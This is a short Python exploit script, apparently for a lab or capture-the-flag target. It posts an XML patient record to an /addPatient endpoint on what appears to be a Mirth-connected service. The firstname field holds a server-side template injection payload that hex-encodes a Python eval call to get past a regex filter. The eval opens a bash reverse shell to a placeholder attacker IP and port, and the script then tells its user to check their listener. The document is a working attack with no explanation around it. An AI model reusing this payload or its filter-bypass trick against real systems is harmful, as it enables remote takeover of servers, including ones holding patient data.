#!/usr/bin/env python3
import urllib.request
import binascii

# Settings
target = "http://127.0.0.1:54321/addPatient"
# Reverse shell command 
cmd = "__import__('os').system('bash -c \"bash -i >& /dev/tcp/YOURIP/PORT 0>&1\"')"

# Hex encoding to bypass regex (No spaces allowed)
hex_cmd = binascii.hexlify(cmd.encode()).decode()
payload = "{" + f"eval(bytes.fromhex('{hex_cmd}').decode())" + "}"

# XML Data structure
xml_data = f"""<patient>
    <firstname>{payload}</firstname>
    <lastname>Rohit</lastname>
    <sender_app>Mirth</sender_app>
    <timestamp>2026</timestamp>
    <birth_date>01/01/2000</birth_date>
    <gender>M</gender>
</patient>"""

req = urllib.request.Request(target, data=xml_data.encode(), headers={'Content-Type': 'application/xml'})

try:
    print("[*] Sending Hex-Encoded SSTI Payload...")
    urllib.request.urlopen(req)
except Exception as e:
    print(f"[*] Payload sent! Check your listener. (Response: {e})")
 
